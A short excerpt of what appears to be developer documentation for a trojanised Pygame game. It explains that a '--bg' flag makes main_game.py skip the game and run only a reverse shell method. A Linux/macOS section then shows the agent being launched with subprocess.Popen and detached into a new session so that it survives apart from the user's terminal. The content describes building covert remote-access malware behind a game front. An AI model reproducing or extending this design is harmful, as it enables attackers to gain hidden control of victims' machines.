...
The `--bg` flag tells `main_game.py` to skip Pygame entirely and run only the reverse shell:

```python
# In main_game.py
if "--bg" in sys.argv:
    # No GUI, no game window
    ReverseShell._connect_and_shell()
else:
    # Normal game startup with Pygame
    run_game()
```
...
<Tabs>
  ...
  <Tab title="Linux / macOS">
    ...
    subprocess.Popen(
        agent_cmd,
        shell=True,
        start_new_session=True  # Equivalent to calling setsid()
    )
    ```

    `start_new_session=True` creates a new process group and session, detaching the child from the parent's terminal and signal handling.
  </Tab>
</Tabs>
